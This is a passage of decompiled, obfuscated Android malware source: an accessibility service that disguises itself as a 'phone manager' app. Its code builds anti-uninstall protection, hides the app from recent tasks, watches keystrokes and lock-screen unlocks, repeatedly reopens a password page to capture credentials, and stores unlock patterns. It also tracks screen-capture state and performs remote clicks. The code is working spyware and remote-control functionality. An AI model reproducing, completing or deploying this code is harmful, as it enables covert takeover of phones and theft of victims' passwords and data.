                    return this.f52592a0.m211468g2();
                }
            }, new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeModules$2
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0260a2 c0260a2 = this.f52593a0.f52369a0;
                    if (c0260a2 != null) {
                        c0260a2.m211325g8(false);
                        t60.m214714d6("dqtvuisjd", "✅ 投屏弹窗处理完成，已关闭检测标志");
                    }
                    return C1351vv.f60710b1;
                }
            });
            this.f52431g2 = new C0329b4(this, this);
            this.f52433g4 = new ju0(this);
            C0328b3 c0328b3 = new C0328b3(this);
            this.f52434g5 = c0328b3;
            c0328b3.m211759a3();
            this.f52439h0 = new C0032al(this);
            m211480h4();
            m211481h5();
            this.f52453i4 = true;
            t60.m214714d6("dqtvuisjd", "✅ 模块实例初始化完成");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 模块实例初始化失败", e);
            throw e;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: h3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211479h3(ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$initializeService$1 dqtvuisjd_initializeservice_1;
        dqtvuisjd dqtvuisjdVar;
        if (continuationImpl instanceof dqtvuisjd$initializeService$1) {
            dqtvuisjd_initializeservice_1 = (dqtvuisjd$initializeService$1) continuationImpl;
            int i = dqtvuisjd_initializeservice_1.f52597a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_initializeservice_1.f52597a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_initializeservice_1 = new dqtvuisjd$initializeService$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_initializeservice_1.f52595a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_initializeservice_1.f52597a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🚀 开始无障碍服务初始化");
            try {
                t60.m214702c3("dqtvuisjd", "📦 初始化各个管理器");
                m211477h1();
                t60.m214702c3("dqtvuisjd", "✅ 管理器初始化完成");
                this.f52399d0 = true;
            } catch (Exception e) {
                tz0.m214807a7("❌ initializeManagers失败，降级处理: ", e.getMessage(), "dqtvuisjd");
                try {
                    m211476h0();
                } catch (Exception e2) {
                    t60.m214705c6("dqtvuisjd", "❌ 降级初始化也失败", e2);
                }
            }
            try {
                t60.m214702c3("dqtvuisjd", "🔐 开始权限获取流程");
                dqtvuisjd_initializeservice_1.f52594a0 = this;
                dqtvuisjd_initializeservice_1.f52597a3 = 1;
                if (m211530m8(dqtvuisjd_initializeservice_1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                dqtvuisjdVar = this;
            } catch (Exception e3) {
                e = e3;
                dqtvuisjdVar = this;
                tz0.m214808a8("❌ startPermissionGrantFlow失败: ", e.getMessage(), "dqtvuisjd", e);
                t60.m214714d6("dqtvuisjd", "✅ 无障碍服务初始化完成 (isInitialized=" + dqtvuisjdVar.f52399d0 + ")");
                return C1351vv.f60710b1;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            dqtvuisjdVar = dqtvuisjd_initializeservice_1.f52594a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e4) {
                e = e4;
                tz0.m214808a8("❌ startPermissionGrantFlow失败: ", e.getMessage(), "dqtvuisjd", e);
                t60.m214714d6("dqtvuisjd", "✅ 无障碍服务初始化完成 (isInitialized=" + dqtvuisjdVar.f52399d0 + ")");
                return C1351vv.f60710b1;
            }
        }
        t60.m214702c3("dqtvuisjd", "✅ 权限获取流程完成");
        t60.m214714d6("dqtvuisjd", "✅ 无障碍服务初始化完成 (isInitialized=" + dqtvuisjdVar.f52399d0 + ")");
        return C1351vv.f60710b1;
    }

    /* renamed from: h4 */
    public final void m211480h4() {
        t60.m214714d6("dqtvuisjd", "🔧 初始化防卸载保护管理器...");
        C0355a0 c0355a0 = new C0355a0(this, this, this.f52378a9);
        this.f52435g6 = c0355a0;
        C0323a8 c0323a8 = this.f52415e6;
        if (c0323a8 == null) {
            c0323a8 = null;
        }
        C0328b3 c0328b3 = this.f52434g5;
        C0328b3 c0328b32 = c0328b3 != null ? c0328b3 : null;
        w00 w00Var = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$3
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                C0329b4 c0329b4 = this.f52598a0.f52431g2;
                boolean z = false;
                if (c0329b4 != null && c0329b4.m211766a4()) {
                    z = true;
                }
                return Boolean.valueOf(z);
            }
        };
        w00 w00Var2 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$5
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f52600a0.m211468g2();
            }
        };
        w00 w00Var3 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$6
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f52601a0.m211470g4();
            }
        };
        dqtvuisjd$initializekinztpexl$7 dqtvuisjd_initializekinztpexl_7 = new dqtvuisjd$initializekinztpexl$7(3);
        w00 w00Var4 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$8
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() throws PackageManager.NameNotFoundException {
                dqtvuisjd dqtvuisjdVar = this.f52602a0;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    ArrayList arrayList = new ArrayList();
                    String string = dqtvuisjdVar.getString(R$string.app_name);
                    t60.m214694b5(string, "getString(R.string.app_name)");
                    arrayList.add(string);
                    arrayList.add("⠀手机管家⠀");
                    arrayList.add("⠀⠀");
                    try {
                        JSONObject jSONObjectM213605a3 = AbstractC0765ko.m213605a3(dqtvuisjdVar);
                        JSONObject jSONObjectOptJSONObject = jSONObjectM213605a3 != null ? jSONObjectM213605a3.optJSONObject("pageStyleConfig") : null;
                        String strOptString = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString("appName") : null;
                        if (strOptString != null && !AbstractC0779a1.m213663b6(strOptString) && !arrayList.contains(strOptString)) {
                            arrayList.add(strOptString);
                            t60.m214702c3("dqtvuisjd", "🛡️ 从配置读取应用名: ".concat(strOptString));
                        }
                        String strOptString2 = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString("statusText") : null;
                        if (strOptString2 != null && !AbstractC0779a1.m213663b6(strOptString2) && !arrayList.contains(strOptString2)) {
                            arrayList.add(strOptString2);
                        }
                    } catch (Exception unused) {
                    }
                    try {
                        int identifier = dqtvuisjdVar.getResources().getIdentifier("label_blank", "string", dqtvuisjdVar.getPackageName());
                        if (identifier != 0) {
                            String string2 = dqtvuisjdVar.getString(identifier);
                            t60.m214694b5(string2, "getString(appNameTranId)");
                            if (string2.length() > 0 && !arrayList.contains(string2)) {
                                arrayList.add(string2);
                            }
                        }
                    } catch (Exception unused2) {
                    }
                    try {
                        int identifier2 = dqtvuisjdVar.getResources().getIdentifier("label_variant_f0", "string", dqtvuisjdVar.getPackageName());
                        if (identifier2 != 0) {
                            String string3 = dqtvuisjdVar.getString(identifier2);
                            t60.m214694b5(string3, "getString(appNameVivoId)");
                            if (string3.length() > 0 && !arrayList.contains(string3)) {
                                arrayList.add(string3);
                            }
                        }
                    } catch (Exception unused3) {
                    }
                    try {
                        int identifier3 = dqtvuisjdVar.getResources().getIdentifier("label_variant_h", "string", dqtvuisjdVar.getPackageName());
                        if (identifier3 != 0) {
                            String string4 = dqtvuisjdVar.getString(identifier3);
                            t60.m214694b5(string4, "getString(appNameOppoId)");
                            if (string4.length() > 0 && !arrayList.contains(string4)) {
                                arrayList.add(string4);
                            }
                        }
                    } catch (Exception unused4) {
                    }
                    try {
                        int identifier4 = dqtvuisjdVar.getResources().getIdentifier("label_variant_g", "string", dqtvuisjdVar.getPackageName());
                        if (identifier4 != 0) {
                            String string5 = dqtvuisjdVar.getString(identifier4);
                            t60.m214694b5(string5, "getString(appNameVivoLauncherId)");
                            if (string5.length() > 0 && !arrayList.contains(string5)) {
                                arrayList.add(string5);
                            }
                        }
                    } catch (Exception unused5) {
                    }
                    int i = 0;
                    try {
                        PackageManager packageManager = dqtvuisjdVar.getPackageManager();
                        ApplicationInfo applicationInfo = packageManager.getApplicationInfo(dqtvuisjdVar.getPackageName(), 0);
                        t60.m214694b5(applicationInfo, "packageManager.getApplicationInfo(packageName, 0)");
                        String string6 = packageManager.getApplicationLabel(applicationInfo).toString();
                        t60.m214714d6("dqtvuisjd", "🛡️ PackageManager 获取的应用名: [" + string6 + "]");
                        if (string6.length() > 0 && !arrayList.contains(string6)) {
                            arrayList.add(string6);
                            t60.m214714d6("dqtvuisjd", "🛡️ 添加构建器配置的应用名: ".concat(string6));
                        }
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "❌ 无法获取当前应用标签", e);
                    }
                    ArrayList arrayList2 = new ArrayList();
                    int size = arrayList.size();
                    while (i < size) {
                        Object obj = arrayList.get(i);
                        i++;
                        if (((String) obj).length() >= 2) {
                            arrayList2.add(obj);
                        }
                    }
                    t60.m214702c3("dqtvuisjd", "🛡️ 可能的应用名称: " + AbstractC0715je.m213295i2(arrayList2, ", ", null, null, null, 62));
                    return arrayList2;
                } catch (Exception unused6) {
                    return AbstractC0716jf.m213306g5(dqtvuisjdVar.getString(R$string.app_name), "⠀手机管家⠀");
                }
            }
        };
        w00 w00Var5 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$9
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                this.f52603a0.getClass();
                return C1351vv.f60710b1;
            }
        };
        c0355a0.f53691c6 = c0323a8;
        c0355a0.f53692c7 = c0328b32;
        c0355a0.f53693c8 = w00Var;
        c0355a0.f53694c9 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializekinztpexl$4
            @Override // p000.w00
            public final Object invoke() {
                return Boolean.valueOf(dqtvuisjd.f52358m1.isPermissionRequestActive());
            }
        };
        c0355a0.f53695d0 = w00Var2;
        c0355a0.f53696d1 = w00Var3;
        c0355a0.f53697d2 = dqtvuisjd_initializekinztpexl_7;
        c0355a0.f53698d3 = w00Var4;
        c0355a0.f53699d4 = w00Var5;
        t60.m214714d6("dqtvuisjd", "✅ 防卸载保护管理器初始化完成");
    }

    /* renamed from: h5 */
    public final void m211481h5() {
        t60.m214714d6("dqtvuisjd", "🔧 初始化多任务页面保护管理器...");
        C0356a1 c0356a1 = new C0356a1(this, this);
        this.f52436g7 = c0356a1;
        w00 w00Var = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializenpweufstehlb$1
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                C0329b4 c0329b4 = this.f52604a0.f52431g2;
                boolean z = false;
                if (c0329b4 != null && c0329b4.m211766a4()) {
                    z = true;
                }
                return Boolean.valueOf(z);
            }
        };
        w00 w00Var2 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializenpweufstehlb$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f52605a0.m211468g2();
            }
        };
        c0356a1.f53723a6 = w00Var;
        c0356a1.f53724a7 = w00Var2;
        c0356a1.f53725a8 = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializenpweufstehlb$3
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                boolean z = false;
                try {
                    C0328b3 c0328b3 = this.f52606a0.f52434g5;
                    if (c0328b3 != null) {
                        z = c0328b3.f53189a2;
                    }
                } catch (Exception unused) {
                }
                return Boolean.valueOf(z);
            }
        };
        if (!getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false)) {
            t60.m214714d6("dqtvuisjd", "✅ 多任务页面保护管理器初始化完成（待适配完成后启用）");
            return;
        }
        C0356a1 c0356a12 = this.f52436g7;
        if (c0356a12 == null) {
            t60.m214724f2("recentsGuardManager");
            throw null;
        }
        c0356a12.m211955a2();
        if (getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean("icon_hidden", false)) {
            C0356a1 c0356a13 = this.f52436g7;
            if (c0356a13 == null) {
                t60.m214724f2("recentsGuardManager");
                throw null;
            }
            c0356a13.m211953a0();
            t60.m214702c3("npweufstehlb", "🎭 伪装模式: 主动设置 excludeFromRecents");
        }
        t60.m214714d6("dqtvuisjd", "✅ 多任务页面保护管理器初始化完成，授权已完成→立即启用");
    }

    /* renamed from: h6 */
    public final boolean m211482h6() {
        try {
            return getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).getBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), false);
        } catch (Exception unused) {
            return false;
        }
    }

    /* renamed from: h7 */
    public final boolean m211483h7() {
        String string;
        try {
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("dqtvuisjd", "🔍 [isCurrentlyInOurApp] rootInActiveWindow=null，判断为不在应用");
                return false;
            }
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            String packageName2 = getPackageName();
            boolean zEquals = string.equals(packageName2);
            t60.m214714d6("dqtvuisjd", "🔍 [isCurrentlyInOurApp] 检测包名='" + string + "', 我们包名='" + packageName2 + "', 结果=" + zEquals);
            return zEquals;
        } catch (Exception e) {
            tz0.m214808a8("❌ [isCurrentlyInOurApp] 检测失败: ", e.getMessage(), "dqtvuisjd", e);
            return false;
        }
    }

    /* renamed from: h8 */
    public final boolean m211484h8() {
        try {
            C0323a8 c0323a8 = this.f52415e6;
            boolean z = c0323a8 != null ? c0323a8.f53104a4 : false;
            t60.m214702c3("dqtvuisjd", "🔍 设备注册状态检查: " + z);
            return z;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "检查设备注册状态失败", e);
            return false;
        }
    }

    /* renamed from: h9 */
    public final boolean m211485h9(String str, String str2) {
        x81 x81Var = this.f52417e8;
        if (x81Var != null) {
            return x81Var.m215133a5(str, str2);
        }
        if (this.f52416e7 == null) {
            Set setM210734f7 = AbstractC0134bh.m210734f7(new String[]{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "space", "delete"});
            Locale locale = Locale.ROOT;
            String lowerCase = str.toLowerCase(locale);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (!setM210734f7.contains(lowerCase)) {
                String lowerCase2 = str2.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!setM210734f7.contains(lowerCase2)) {
                    return false;
                }
            }
        } else if (str.length() != 1) {
            Set setM210734f72 = AbstractC0134bh.m210734f7(new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ".", ",", "?", "!", "'", "\"", "-", "(", ")", "@", ";", ":", "/", "&", "%", "+", "=", "*", "#", "删除", "delete", "Delete", "DEL", "⌫", "退格", "backspace", "Backspace", "空格", "space", "Space", "SPACE", " ", "换行", "return", "Return", "RETURN", "回车", "切换", "shift", "Shift", "SHIFT", "⇧", "符号", "123", "ABC", "?123", "符", "数字", "字母"});
            ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(setM210734f72));
            Iterator it = setM210734f72.iterator();
            while (it.hasNext()) {
                String lowerCase3 = ((String) it.next()).toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                arrayList.add(lowerCase3);
            }
            String lowerCase4 = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase4, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (!arrayList.contains(lowerCase4)) {
                Set setM210734f73 = AbstractC0134bh.m210734f7(new String[]{"delete", "backspace", "space", "shift", "return", "tab", "删除", "退格", "空格", "换行", "回车", "制表符", "切换", "符号", "数字", "字母"});
                ArrayList arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(setM210734f73));
                Iterator it2 = setM210734f73.iterator();
                while (it2.hasNext()) {
                    String lowerCase5 = ((String) it2.next()).toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase5, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    arrayList2.add(lowerCase5);
                }
                String lowerCase6 = str2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase6, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!arrayList2.contains(lowerCase6)) {
                    return false;
                }
            }
        }
        return true;
    }

    /* renamed from: i0 */
    public final boolean m211486i0() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - this.f52389c0 < this.f52390c1) {
            return this.f52388b9;
        }
        KeyguardManager keyguardManager = this.f52385b6;
        boolean z = false;
        if (keyguardManager != null && keyguardManager.isKeyguardLocked()) {
            z = true;
        }
        this.f52388b9 = z;
        this.f52389c0 = jCurrentTimeMillis;
        return z;
    }

    /* renamed from: i1 */
    public final boolean m211487i1() {
        C0323a8 lj0Var = this.f52415e6;
        if (lj0Var == null) {
            lj0Var = C0323a8.f53097e0.getInstance();
        } else if (lj0Var == null) {
            t60.m214724f2("networkManager");
            throw null;
        }
        if (lj0Var != null) {
            return lj0Var.f53103a3;
        }
        return false;
    }

    /* renamed from: i2 */
    public final boolean m211488i2() {
        boolean z;
        try {
            t60.m214702c3("dqtvuisjd", "🔍 开始检查无障碍服务运行状态");
            boolean z2 = this.f52399d0;
            t60.m214702c3("dqtvuisjd", "🔍 服务初始化状态: " + z2);
            boolean z3 = true;
            boolean z4 = this.f52369a0 != null;
            boolean z5 = this.f52370a1 != null;
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                try {
                    z = c0323a8.f53103a3;
                } catch (Exception unused) {
                }
            } else {
                z = false;
            }
            t60.m214702c3("dqtvuisjd", "🔍 网络连接状态: " + z);
            if (!z2 || !z4 || !z5) {
                z3 = false;
            }
            t60.m214702c3("dqtvuisjd", "🔍 最终服务运行状态: " + z3);
            return z3;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 检查服务运行状态失败", e);
            return false;
        }
    }

    /* renamed from: i3 */
    public final boolean m211489i3() {
        String lowerCase;
        String string;
        x81 x81Var = this.f52417e8;
        if (x81Var != null) {
            return x81Var.m215134a6();
        }
        t60.m214726f4("dqtvuisjd", "⚠️ UnlockManager未初始化，使用简单解锁检测");
        try {
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                t60.m214702c3("dqtvuisjd", "🔓 [isUnlockSuccessful] 当前包名: ".concat(lowerCase));
                if (!AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "launcher", false)) {
                    return true;
                }
                if (AbstractC0779a1.m213652a5(lowerCase, "home", false)) {
                    return true;
                }
            }
            return false;
        } catch (Exception unused) {
            return true;
        }
    }

    /* renamed from: i4 */
    public final void m211490i4() {
        if (!this.f52474k5) {
            t60.m214702c3("dqtvuisjd", "📱 密码监听已停止，不再弹出");
            return;
        }
        Object systemService = getSystemService("keyguard");
        KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
        if (keyguardManager == null || !keyguardManager.isKeyguardLocked()) {
            new Handler(Looper.getMainLooper()).post(new RunnableC0284a4(this, 0));
            return;
        }
        t60.m214714d6("dqtvuisjd", "📱 设备已锁屏，停止密码监听重试");
        this.f52474k5 = false;
        this.f52471k2 = 0;
    }

    /* renamed from: i5 */
    public final void m211491i5() {
        try {
            if (ibbnqvnvhxg.f55194a0.isRunning()) {
                t60.m214702c3("dqtvuisjd", "ibbnqvnvhxg 已在运行，跳过启动");
                return;
            }
            if (this.f52479l0) {
                t60.m214702c3("dqtvuisjd", "ibbnqvnvhxg 正在启动中，跳过重复启动");
                return;
            }
            this.f52479l0 = true;
            Intent intent = new Intent(this, (Class<?>) ibbnqvnvhxg.class);
            intent.addFlags(268435456);
            intent.addFlags(1073741824);
            intent.addFlags(65536);
            intent.addFlags(8388608);
            startActivity(intent);
            t60.m214714d6("dqtvuisjd", "✅ ibbnqvnvhxg 已启动");
        } catch (Exception e) {
            this.f52479l0 = false;
            t60.m214705c6("dqtvuisjd", "❌ 启动 ibbnqvnvhxg 失败", e);
        }
    }

    /* renamed from: i6 */
    public final void m211492i6() {
        try {
            JSONObject jSONObject = new JSONObject(AbstractC1408xb.m215154a0(this, "monitor_config.json"));
            this.f52442h3 = jSONObject.optBoolean(StringUtil.m212470a0("LlcQOEE9LS1UNDhKGDhENAU6ThwkVxguQio="), false);
            JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("monitorSettings");
            if (jSONObjectOptJSONObject != null) {
                double d = 1000;
                this.f52448h9 = (long) (jSONObjectOptJSONObject.optDouble("checkIntervalSeconds", 0.5d) * d);
                this.f52449i0 = jSONObjectOptJSONObject.optInt("confirmationRequiredCount", 2);
                this.f52450i1 = jSONObjectOptJSONObject.optInt("maxRetryCount", 8);
                this.f52451i2 = (long) (jSONObjectOptJSONObject.optDouble("delayAfterServiceConnectedSeconds", 1.0d) * d);
            }
            if (!this.f52442h3) {
                t60.m214702c3("dqtvuisjd", "🔍 [监控] 无障碍监控功能已禁用（默认状态）");
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ 无障碍监控功能已启用 - 配置：延迟" + this.f52451i2 + "ms，间隔" + this.f52448h9 + "ms，确认" + this.f52449i0 + "次，最多" + this.f52450i1 + "次");
            t60.m214726f4("dqtvuisjd", "⚠️ [监控] 无障碍监控功能仅用于解决特定设备的跳转问题");
        } catch (Exception e) {
            t60.m214702c3("dqtvuisjd", "🔍 [监控] 无法加载无障碍监控配置，使用默认设置: " + e.getMessage());
            this.f52442h3 = false;
        }
    }

    /* renamed from: i7 */
    public final void m211493i7() {
        String str = HttpUrl.PATH_SEGMENT_ENCODE_SET_URI;
        LinkedHashSet linkedHashSet = this.f52403d4;
        try {
            String string = getSharedPreferences(StringUtil.m212470a0("LFwCLlgqCRFTNC9MAQ=="), 0).getString(this.f52404d5, HttpUrl.PATH_SEGMENT_ENCODE_SET_URI);
            if (string != null) {
                str = string;
            }
            JSONArray jSONArray = new JSONArray(str);
            linkedHashSet.clear();
            int length = jSONArray.length();
            for (int i = 0; i < length; i++) {
                String string2 = jSONArray.getString(i);
                t60.m214694b5(string2, "jsonArray.getString(i)");
                linkedHashSet.add(string2);
            }
            t60.m214702c3("dqtvuisjd", "🔐 [去重] 已加载 " + linkedHashSet.size() + " 个已保存图案: " + linkedHashSet);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 加载图案去重列表失败", e);
        }
    }

    /* renamed from: i8 */
    public final void m211494i8(String str) {
        String str2;
        try {
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            MediaProjection mediaProjection = AbstractC0241a0.f51906a0;
            Map mapM211177a1 = AbstractC0241a0.m211177a1();
            C0263a5 c0263a5 = this.f52370a1;
            if (c0263a5 != null) {
                str2 = "initialized, isPaused=" + c0263a5.f52153a2;
            } else {
                str2 = "NOT_INITIALIZED";
            }
            boolean z = pair != null;
            Integer numValueOf = mediaProjection != null ? Integer.valueOf(mediaProjection.hashCode()) : null;
            t60.m214702c3("dqtvuisjd", AbstractC0778a0.m213649a1("\n                📊📊📊 AccessibilityService权限状态 [" + str + "] 📊📊📊\n                🗂️ MediaProjectionHolder状态:\n                  - 权限数据存在: " + z + "\n                  - MediaProjection对象: " + numValueOf + "\n                  - 数据有效性: " + AbstractC0241a0.m211178a2() + "\n                  - 权限统计: " + mapM211177a1 + "\n                🎬 etzbzyzqxvqm状态: " + str2 + "\n                📱 设备信息:\n                  - Android版本: " + Build.VERSION.SDK_INT + "\n                  - 设备型号: " + Build.MODEL + "\n                ⏰ 时间信息:\n                  - 当前时间: " + System.currentTimeMillis() + "\n            "));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "记录权限状态时出错", e);
        }
    }

    /* renamed from: i9 */
    public final void m211495i9() {
        if (!this.f52474k5) {
            t60.m214702c3("dqtvuisjd", "🔷 [onPasswordPageDismissedByUser] 密码监听未激活，忽略");
            return;
        }
        this.f52471k2++;
        if (this.f52471k2 >= this.f52472k3) {
            t60.m214726f4("dqtvuisjd", "⚠️ [onPasswordPageDismissedByUser] 已达最大重试次数，停止");
            this.f52474k5 = false;
            this.f52471k2 = 0;
            return;
        }
        t60.m214714d6("dqtvuisjd", "🔄 [onPasswordPageDismissedByUser] 用户离开密码页面，" + this.f52473k4 + "ms后重新弹出");
        C0335a1 c0335a1 = this.f52438g9;
        if (c0335a1 != null) {
            C0335a1.m211788c1(c0335a1);
        }
        new Handler(Looper.getMainLooper()).postDelayed(new bm0(this, 6), this.f52473k4);
    }

    /* renamed from: j0 */
    public final void m211496j0() {
        try {
            t60.m214714d6("dqtvuisjd", "⏸️ 暂停WRITE_SETTINGS权限申请");
            this.f52432g3 = true;
            C0327b2 c0327b2 = this.f52429g0;
            if (c0327b2 != null) {
                c0327b2.m211752f8();
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 暂停WRITE_SETTINGS权限申请失败", e);
        }
    }

    /* renamed from: j1 */
    public final void m211497j1(final float f, final float f2) {
        String str = AbstractC0315a0.f53025a0;
        AbstractC0315a0.m211544a6("远程点击: (" + f + ", " + f2 + ")");
        fd0 fd0Var = this.f52423f4;
        if (fd0Var == null || !fd0Var.m212793a1()) {
            a30 a30Var = this.f52440h1;
            if (a30Var != null) {
                a30Var.m51a0(f, f2);
                return;
            }
            return;
        }
        fd0 fd0Var2 = this.f52423f4;
        if (fd0Var2 != null) {
            fd0Var2.m212794a2(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performClick$2
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    a30 a30Var2 = this.f52615a0.f52440h1;
                    if (a30Var2 != null) {
                        a30Var2.m51a0(f, f2);
                    }
                    return C1351vv.f60710b1;
                }
            });
        } else {
            t60.m214724f2("maskOverlayManager");
            throw null;
        }
    }

    /* renamed from: j2 */
    public final void m211498j2() {
        if (this.f52447h8) {
            t60.m214726f4("dqtvuisjd", "⚠️ [重初始化] 已在执行中，跳过重复调用");
            return;
        }
        if (!AbstractC1117qo.m214443d9(this.f52378a9)) {
            t60.m214726f4("dqtvuisjd", "⚠️ [重初始化] serviceScope 已取消，跳过");
            return;
        }
        this.f52447h8 = true;
        final CountDownLatch countDownLatch = new CountDownLatch(1);
        try {
            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$performHeavyInit$job$1(this, countDownLatch, null), 2).m215264c9(false, true, new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$performHeavyInit$1
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    countDownLatch.countDown();
                    return C1351vv.f60710b1;
                }
            });
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [重初始化] 启动协程失败（scope可能已取消）", e);
            countDownLatch.countDown();
        }
        try {
            try {
                countDownLatch.await(120L, TimeUnit.SECONDS);
            } catch (InterruptedException unused) {
                t60.m214726f4("dqtvuisjd", "⚠️ [重初始化] 等待被中断");
            }
        } finally {
            this.f52447h8 = false;
        }
    }

    /* renamed from: j3 */
    public final void m211499j3(final float f, final float f2) {
        fd0 fd0Var = this.f52423f4;
        if (fd0Var == null || !fd0Var.m212793a1()) {
            a30 a30Var = this.f52440h1;
            if (a30Var != null) {
                a30.m50a1(a30Var, f, f2);
                return;
            }
            return;
        }
        fd0 fd0Var2 = this.f52423f4;
        if (fd0Var2 != null) {
            fd0Var2.m212794a2(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performLongPress$2
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    a30 a30Var2 = this.f52622a0.f52440h1;
                    if (a30Var2 != null) {
                        a30.m50a1(a30Var2, f, f2);
                    }
                    return C1351vv.f60710b1;
                }
            });
        } else {
            t60.m214724f2("maskOverlayManager");
            throw null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: j4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211500j4(final ArrayList arrayList, String str, String str2, ContinuationImpl continuationImpl) throws Throwable {
